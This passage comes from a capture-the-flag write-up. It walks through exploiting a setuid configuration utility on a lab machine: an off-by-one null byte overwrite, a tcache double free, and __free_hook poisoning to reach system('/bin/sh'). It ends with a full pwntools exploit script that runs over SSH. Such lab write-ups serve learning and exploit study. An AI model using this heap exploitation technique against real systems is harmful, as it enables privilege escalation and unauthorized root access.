<span class="n">add</span><span class="p">()</span>				<span class="c1"># add two empty configs
</span><span class="n">add</span><span class="p">()</span>
<span class="n">main_arena_leak_u</span> <span class="o">=</span> <span class="n">readCFG</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>	<span class="c1"># get leak
# addresses
# offset is constant in each runtime, so I looked it up in gdb and calculated it once
</span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">main_arena_leak_u</span> <span class="o">-</span> <span class="mh">0x1e4ca0</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1e75a8</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x52fd0</span>
</code></pre></div></div>
<p class="text-justify">From this base address we can also calculate the address of <em>free_hook</em> and <em>system</em> as their place will also be at a fixed place measured from the base address. Using <em>objdump -T</em> on the libc we downloaded from the server via <em>scp</em> will get us there:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-T</span> libc.so.6 | <span class="nb">grep </span>free_hook
<span class="go">00000000001e75a8  w   DO .bss   0000000000000008  GLIBC_2.2.5 __free_hook
</span></code></pre></div></div>
<p>Analog procedure for <em>system</em>.</p>
<h3 id="null-byte-overwrite-vulnerability">Null byte overwrite vulnerability</h3>
<p class="text-justify">Looking at the binary in <em>Ghidra</em> we notice in the function that creates a new config that once the game description is longer or equal to the chosen description size <em>n</em> it is terminated by a null byte at the <em>n+1st</em> position. However malloc allocates a chunk of size <em>n</em> and then writes <em>n+1</em> bytes.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">__dest</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">sVar5</span><span class="p">)</span> <span class="p">{</span>		
	<span class="n">local_428</span><span class="p">[</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">__dest</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>	<span class="err">#</span> <span class="n">adding</span> <span class="sc">'\0'</span> <span class="n">to</span> <span class="n">a</span> <span class="n">description</span> <span class="n">of</span> <span class="n">size</span> <span class="n">n</span>
<span class="p">}</span>
<span class="n">pvVar4</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">((</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">__dest</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">));</span>	
<span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span> 
	<span class="n">sVar6</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">local_428</span><span class="p">);</span>			<span class="err">#</span> <span class="n">sets</span> <span class="n">sVar6</span> <span class="n">to</span> <span class="n">n</span><span class="o">+</span><span class="mi">1</span> <span class="n">bytes</span> 
	<span class="k">if</span> <span class="p">(</span><span class="n">sVar6</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="kt">long</span><span class="p">)</span><span class="n">counter</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span> 	<span class="err">#</span> <span class="n">breaks</span> <span class="n">after</span> <span class="n">n</span><span class="o">+</span><span class="mi">1</span> <span class="n">bytes</span> <span class="n">were</span> <span class="n">written</span>
	<span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">counter</span> <span class="o">+</span> <span class="n">lVar1</span><span class="p">)</span> <span class="o">=</span> <span class="n">local_428</span><span class="p">[</span><span class="n">counter</span><span class="p">];</span> 
	<span class="n">counter</span> <span class="o">=</span> <span class="n">counter</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<h3 id="aligning-game-descriptions-adjacent">Aligning game descriptions adjacent</h3>
<p class="text-justify">In order to be able to abuse the null byte overwrite we need two adjacent chunks. To illustrate how to accomplish this, we use <em>gdb</em> to look at the heap and get an understanding of how the allocated chunks look like in memory.<br />
For this we create a sample of two configs of size 0x38 and write 0x38 bytes of data into the name of the config as well as into the description and look then at the chunks in memory:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>	<span class="c1"># A's will be 41 in memory. The only constraint to the chunk
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>	<span class="c1"># size is that it has to be congruent 8 modulo 16.
</span></code></pre></div></div>
<figure class="">
  <img src="/assets/images/playerTwo/Chunk1.png" alt="this is a placeholder image" />
  
    <figcaption>
      The fd/bk pointer of the chunk in the unsorted bin points into the main arena of libc.

    </figcaption>
  
</figure>

<figure class="">
  <img src="/assets/images/playerTwo/Chunk2.png" alt="this is a placeholder image" />
  
    <figcaption>
      Illustrating the null byte overwrite.

    </figcaption>
  
</figure>

<p class="text-justify">So to get two descriptions adjacent I thought that since the config name always needs a chunk of size 0x30 of usable size (which is 0x41 in memory): If I allocate one or two configs with description size 0x30 and free them the next configs with description sizes bigger than 0x30 might use the just freed 0x30 chunks but allocate the descriptions after all the previously allocated chunks. The code and result might clarify what I just tried to explain with words:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>	<span class="c1"># A's will be 41 in memory
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>	<span class="c1"># B's 42, 0x38 = 3*16+8 = 56 bytes
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>	<span class="c1"># allocating two chunks with a size bigger than 0x30
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>	<span class="c1"># but also with a size%16=8 
</span></code></pre></div></div>
<figure class="">
  <img src="/assets/images/playerTwo/Chunk3.png" alt="this is a placeholder image" />
  
    <figcaption>
      Game descriptions being adjacent - the setup needed for the double free.

    </figcaption>
  
</figure>

<p>So we only have to repeat what we have done earlier: free and then allocate the same chunk again:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>	<span class="c1"># A's will be 41 in memory
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>	<span class="c1"># B's 42, 0x38 = 3*16+8 = 56 bytes
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>	<span class="c1"># allocating two chunks with a size bigger than 0x30
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>	<span class="c1"># but also with a size%16=8 
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>	
</code></pre></div></div>
<figure class="">
  <img src="/assets/images/playerTwo/Chunk4.png" alt="this is a placeholder image" />
  
    <figcaption>
      Our plan worked - we overwrote the chunk size header from 0x171 to 0x100.

    </figcaption>
  
</figure>

<h3 id="the-double-free">The double free</h3>
<p class="text-justify">Now that we were able to set the chunk size header from 0x1XY to 0x100 we can do a double free attack similar to the before mentioned <em>zero_to_hero</em> challenge <a href="#[1]">[1]</a> with small variations.<br />
To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in memory) where we want to write our config name to. For the chunks I want to align the descriptions adjacent I chose sizes 0x58 (chunk 9) and 0x180 (chunk 10):</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Dummies
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>	<span class="c1"># Dummies are necessary to get two config _descriptions_ aligned right
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>	<span class="c1"># after each other so that it is possible to overwrite the second chunk
</span>		<span class="c1"># size header. The size is deliberately set at 0x30, because this will
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>		<span class="c1"># result in a chunk size of 0x41 in memory, which is also used for the 
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>	<span class="c1"># config _name_. Freeing these two chunks results in 4 free 0x40 chunks.
# Allocate config descriptions adjacent in memory
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span>	<span class="c1"># Allocation of size &gt;0x40 will do the following: allocate 0x40 of the
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>	<span class="c1"># first dummy for config name and allocate 0x58 _after_ the dummies,
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>		<span class="c1"># because there is no space for it earlier. Same goes for 0x180:
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>			<span class="c1"># 0x40 of the dummy and 0x180 _right after_ the 0x58 chunk.
</span></code></pre></div></div>
<p class="text-justify">The key is to free chunk 10 so this chunk will go into the 0x180 tcache bin. Then we will overwrite the chunk size from 0x180 to 0x100 with chunk 9 but also write <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> at the beginning of chunk 9. As the program will cut off descriptions after the first null byte, strings such as <code class="language-plaintext highlighter-rouge">p64('/bin/sh\x00') + b"A"*(0x50)</code> won’t work as. To solve this puzzle we need to do it in two steps:</p>
<ul>
  <li>overwrite the chunk 10’s size header</li>
  <li>write <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> into chunk 9 and let the rest untouched</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Dummies
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>	<span class="c1"># Dummies are necessary to get two config _descriptions_ aligned right
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>	<span class="c1"># after each other so that it is possible to overwrite the second chunk
</span>		<span class="c1"># size header. The size is deliberately set at 0x30, because this will
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>		<span class="c1"># result in a chunk size of 0x41 in memory, which is also used for the 
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>	<span class="c1"># config _name_. Freeing these two chunks results in 4 free 0x40 chunks.
# Allocate config descriptions adjacent in memory
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span>	<span class="c1"># Allocation of size &gt;0x40 will do the following: allocate 0x40 of the
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>	<span class="c1"># first dummy for config name and allocate 0x58 _after_ the dummies,
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>		<span class="c1"># because there is no space for it earlier. Same goes for 0x180:
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>			<span class="c1"># 0x40 of the dummy and 0x180 _right after_ the 0x58 chunk.
# /bin/sh and null byte overwrite the chunksize header from 191 to 100
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span>	<span class="c1"># As the string will be terminated after the first null byte,
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>			<span class="c1"># we have to do this in two steps. Overwrite first, free...
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span><span class="c1"># ... and write /bin/sh plus the null byte and leave the rest.
</span></code></pre></div></div>
<p class="text-justify">Setting the chunk size header of chunk 10 to 0x100 leaves the chunk inside the 0x190 tcache bin but sets its size to 0x100. Adding an empty chunk will now allocate a chunk at the same address where the previous 0x180 chunk was located however freeing it will put it into the 0x100 tcache bin. And if we now allocate a chunk size of 0x180 it will use the manipulated chunk size from the 0x190 tcache (because 0x180 will need 0x190 of memory space). But as we have changed its header from 0x191 to 0x100 it will be put into the 0x100 tcache bin thus we are having two chunks of size 0x100 in the tcache 0x100 bin but both point to the same address!</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Dummies
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>	<span class="c1"># Dummies are necessary to get two config _descriptions_ aligned right
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>	<span class="c1"># after each other so that it is possible to overwrite the second chunk
</span>		<span class="c1"># size header. The size is deliberately set at 0x30, because this will
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>		<span class="c1"># result in a chunk size of 0x41 in memory, which is also used for the 
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>	<span class="c1"># config _name_. Freeing these two chunks results in 4 free 0x40 chunks.
# Allocate config descriptions adjacent in memory
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span>	<span class="c1"># Allocation of size &gt;0x40 will do the following: allocate 0x40 of the
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>	<span class="c1"># first dummy for config name and allocate 0x58 _after_ the dummies,
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>		<span class="c1"># because there is no space for it earlier. Same goes for 0x180:
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>			<span class="c1"># 0x40 of the dummy and 0x180 _right after_ the 0x58 chunk.
# /bin/sh and null byte overwrite the chunksize header from 180 to 100
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span>	<span class="c1"># As the string will be terminated after the first null byte,
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>			<span class="c1"># we have to do this in two steps. Overwrite first, free...
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span><span class="c1"># ... and write /bin/sh plus the null byte and leave the rest.
</span>
<span class="n">add</span><span class="p">()</span>			<span class="c1"># Adding an empty config will allow us to free the same address 
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>		<span class="c1"># to the tcache 0xf0 bin twice
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>	<span class="c1"># Because it thinks there is an 180 size chunk at this address it'll
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></div></div>
<figure class="">
  <img src="/assets/images/playerTwo/tcache.png" alt="this is a placeholder image" />
  
    <figcaption>
      Upper: Chunk 10 inside the 0x190 tcache bin but with size 0x100.<br /> Lower: Two chunks of size 0x100 inside the 0x100 tcache bin but pointing to the same address.

    </figcaption>
  
</figure>

<h3 id="tcache-poisoning">Tcache poisoning</h3>
<p>Now we simply need to do the Tcache poisoning:</p>
<ul>
  <li>allocate 3 chunks each of size 0xf0, which will need 0x100 in memory thus using the chunks from the 0x100 tcache bin</li>
  <li>write the free hook into the first chunk, junk into the second, and the system call into the third.</li>
  <li>Free chunk 9</li>
  <li>Become root.</li>
</ul>

<h2 id="complete-script">Complete Script</h2>
<p>The complete script and the pure joy running it:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="c1">#p = process('./Protobs') 
</span><span class="n">sshConn</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'10.10.10.170'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'observer'</span><span class="p">,</span> <span class="n">keyfile</span><span class="o">=</span><span class="s">'id_rsa'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">sshConn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/opt/Configuration_Utility/Protobs'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="s">b''</span><span class="p">,</span> <span class="n">config</span><span class="o">=</span><span class="s">b''</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'protobs@player2:~$ '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="c1"># name through controller (6 items)
</span>    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Game                ]: '</span><span class="p">,</span> <span class="n">config</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Contrast            ]: '</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Gamma               ]: '</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Resolution X-Axis   ]: '</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Resolution Y-Axis   ]: '</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Controller          ]: '</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Size of Description ]: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">),</span> <span class="mi">0</span><span class="p">)))</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Description         ]: '</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
    <span class="k">return</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">ID</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'protobs@player2:~$ '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Config Index    ]: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ID</span><span class="p">))</span>
    <span class="k">return</span>

<span class="k">def</span> <span class="nf">readCFG</span><span class="p">(</span><span class="n">ID</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'protobs@player2:~$ '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[ Config Index    ]: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ID</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'[ Description         ]: '</span><span class="p">)</span>
    <span class="k">return</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)))</span>

<span class="c1"># Getting chunks into the unsorted bin by filling up the 0xf8 tcache bin with chunks 0-6
# chunk 7 and 8 go into unsorted bin with its fd and bk pointer pointing to the main arena
# in libc
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="c1"># allocate again to read the fd/bk pointer of the chunks in the allocated bins. tcache will be
# allocated first
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
<span class="n">add</span><span class="p">()</span>
<span class="n">add</span><span class="p">()</span>
<span class="c1"># get leak
</span><span class="n">main_arena_leak_u</span> <span class="o">=</span> <span class="n">readCFG</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="c1"># addresses
# offset is constant in each runtime, so I looked it up in gdb and calculated it once
</span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">main_arena_leak_u</span> <span class="o">-</span> <span class="mh">0x1e4ca0</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1e75a8</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x52fd0</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Main arena leak  : {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">main_arena_leak_u</span><span class="p">)))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Libc base address: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Free hook address: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"System address   : {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)))</span>

<span class="c1"># Null byte overwrite to code execution
# Dummies
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>	<span class="c1"># Dummies are necessary to get two config _descriptions_ aligned right
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>	<span class="c1"># after each other so that it is possible to overwrite the second chunk
</span>		<span class="c1"># size header. The size is deliberately set at 0x30, because this will
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>		<span class="c1"># result in a chunk size of 0x41 in memory, which is also used for the 
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>	<span class="c1"># config _name_. Freeing these two chunks results in 4 free 0x40 chunks.
# Allocate config descriptions adjacent in memory
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span>	<span class="c1"># Allocation of size &gt;0x40 will do the following: allocate 0x40 of the
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>	<span class="c1"># first dummy for config name and allocate 0x58 _after_ the dummies,
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>		<span class="c1"># because there is no space for it earlier. Same goes for 0x180:
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>			<span class="c1"># 0x40 of the dummy and 0x180 _right after_ the 0x58 chunk.
# /bin/sh and null byte overwrite the chunksize header from 180 to 100
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span>	<span class="c1"># As the string will be terminated after the first null byte,
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>			<span class="c1"># we have to do this in two steps. Overwrite first, free...
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span><span class="c1"># ... and write /bin/sh plus the null byte and leave the rest.
</span><span class="n">add</span><span class="p">()</span>			<span class="c1"># Adding an empty config will allow us to free the same address 
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>		<span class="c1"># to the tcache 0xf0 bin twice
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>	<span class="c1"># Because it thinks there is an 180 size chunk at this address it'll
</span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>		<span class="c1"># allocate it here. When freeing, though, it sees its size to be 0x100
# tcache poison		# and therefore putting into the 0x100 bin, too.
</span><span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="s">'D'</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>

